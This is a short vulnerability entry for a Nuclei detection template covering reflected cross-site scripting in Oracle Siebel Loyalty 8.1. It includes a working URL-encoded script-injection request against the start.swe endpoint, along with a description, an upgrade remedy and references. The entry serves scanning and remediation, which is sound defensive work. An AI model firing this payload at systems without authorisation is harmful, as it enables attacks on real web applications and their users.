# Nuclei Template: Oracle Siebel Loyalty 8.1 - Cross-Site Scripting
**Template ID:** oracle-siebel-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`oracle-siebel-xss.yaml`)

## Vulnerability Information & PoC

## Description
A vulnerability in Oracle Siebel Loyalty allows remote unauthenticated attackers to inject arbitrary Javascript code into the responses returned by the '/loyalty_enu/start.swe/' endpoint.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## Remediation
Upgrade to Siebel Loyalty version 8.2 or later.

## References
- https://packetstormsecurity.com/files/86721/Oracle-Siebel-Loyalty-8.1-Cross-Site-Scripting.html
- https://exploit-db.com/exploits/47762
- https://docs.oracle.com/cd/E95904_01/books/Secur/siebel-security-hardening.html
